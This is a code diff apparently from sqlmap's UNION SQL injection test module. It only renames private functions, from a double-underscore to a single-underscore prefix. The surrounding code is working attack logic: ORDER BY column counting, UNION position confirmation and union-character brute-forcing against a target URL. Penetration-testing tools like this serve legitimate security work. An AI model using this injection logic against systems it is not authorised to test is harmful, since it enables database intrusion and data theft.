@@ -41,21 +41,21 @@ from lib.core.unescaper import unescaper
 from lib.request.comparison import comparison
 from lib.request.connect import Connect as Request
 
-def __findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=PAYLOAD.WHERE.ORIGINAL):
+def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=PAYLOAD.WHERE.ORIGINAL):
     """
     Finds number of columns affected by UNION based injection
     """
     retVal = None
 
-    def __orderByTechnique():
-        def __orderByTest(cols):
+    def _orderByTechnique():
+        def _orderByTest(cols):
             query = agent.prefixQuery("ORDER BY %d" % cols, prefix=prefix)
             query = agent.suffixQuery(query, suffix=suffix, comment=comment)
             payload = agent.payload(newValue=query, place=place, parameter=parameter, where=where)
             page, headers = Request.queryPage(payload, place=place, content=True, raise404=False)
             return not re.search(r"(warning|error|order by|failed)", page or "", re.I) and comparison(page, headers) or re.search(r"data types cannot be compared or sorted", page or "", re.I)
 
-        if __orderByTest(1) and not __orderByTest(randomInt()):
+        if _orderByTest(1) and not _orderByTest(randomInt()):
             infoMsg = "ORDER BY technique seems to be usable. "
             infoMsg += "This should reduce the time needed "
             infoMsg += "to find the right number "
@@ -66,13 +66,13 @@ def __findUnionCharCount(comment, place, parameter, value, prefix, suffix, where
             lowCols, highCols = 1, ORDER_BY_STEP
             found = None
             while not found:
-                if __orderByTest(highCols):
+                if _orderByTest(highCols):
                     lowCols = highCols
                     highCols += ORDER_BY_STEP
                 else:
                     while not found:
                         mid = highCols - (highCols - lowCols) / 2
-                        if __orderByTest(mid):
+                        if _orderByTest(mid):
                             lowCols = mid
                         else:
                             highCols = mid
@@ -87,7 +87,7 @@ def __findUnionCharCount(comment, place, parameter, value, prefix, suffix, where
     lowerCount, upperCount = conf.uColsStart, conf.uColsStop
 
     if lowerCount == 1:
-        found = kb.orderByColumns or __orderByTechnique()
+        found = kb.orderByColumns or _orderByTechnique()
         if found:
             kb.orderByColumns = found
             infoMsg = "target url appears to have %d column%s in query" % (found, 's' if found > 1 else "")
@@ -155,7 +155,7 @@ def __findUnionCharCount(comment, place, parameter, value, prefix, suffix, where
 
     return retVal
 
-def __unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLOAD.WHERE.ORIGINAL):
+def _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLOAD.WHERE.ORIGINAL):
     validPayload = None
     vector = None
 
@@ -235,22 +235,22 @@ def __unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYL
 
     return validPayload, vector
 
-def __unionConfirm(comment, place, parameter, prefix, suffix, count):
+def _unionConfirm(comment, place, parameter, prefix, suffix, count):
     validPayload = None
     vector = None
 
     # Confirm the union SQL injection and get the exact column
     # position which can be used to extract data
-    validPayload, vector = __unionPosition(comment, place, parameter, prefix, suffix, count)
+    validPayload, vector = _unionPosition(comment, place, parameter, prefix, suffix, count)
 
     # Assure that the above function found the exploitable full union
     # SQL injection position
     if not validPayload:
-        validPayload, vector = __unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLOAD.WHERE.NEGATIVE)
+        validPayload, vector = _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLOAD.WHERE.NEGATIVE)
 
     return validPayload, vector
 
-def __unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix):
+def _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix):
     """
     This method tests if the target url is affected by an union
     SQL injection vulnerability. The test is done up to 50 columns
@@ -264,10 +264,10 @@ def __unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix
     if conf.uColsStop == conf.uColsStart:
         count = conf.uColsStart
     else:
-        count = __findUnionCharCount(comment, place, parameter, value, prefix, suffix, PAYLOAD.WHERE.ORIGINAL if isNullValue(kb.uChar) else PAYLOAD.WHERE.NEGATIVE)
+        count = _findUnionCharCount(comment, place, parameter, value, prefix, suffix, PAYLOAD.WHERE.ORIGINAL if isNullValue(kb.uChar) else PAYLOAD.WHERE.NEGATIVE)
 
     if count:
-        validPayload, vector = __unionConfirm(comment, place, parameter, prefix, suffix, count)
+        validPayload, vector = _unionConfirm(comment, place, parameter, prefix, suffix, count)
 
         if not all([validPayload, vector]) and not all([conf.uChar, conf.dbms]):
             warnMsg = "if UNION based SQL injection is not detected, "
@@ -281,7 +281,7 @@ def __unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix
                     warnMsg += "(e.g. --union-char=1) "
                 else:
                     conf.uChar = kb.uChar = str(randomInt(2))
-                    validPayload, vector = __unionConfirm(comment, place, parameter, prefix, suffix, count)
+                    validPayload, vector = _unionConfirm(comment, place, parameter, prefix, suffix, count)
 
             if not conf.dbms:
                 if not conf.uChar:
@@ -305,7 +305,7 @@ def unionTest(comment, place, parameter, value, prefix, suffix):
         return
 
     kb.technique = PAYLOAD.TECHNIQUE.UNION
-    validPayload, vector = __unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix)
+    validPayload, vector = _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix)
 
     if validPayload:
         validPayload = agent.removePayloadDelimiters(validPayload)
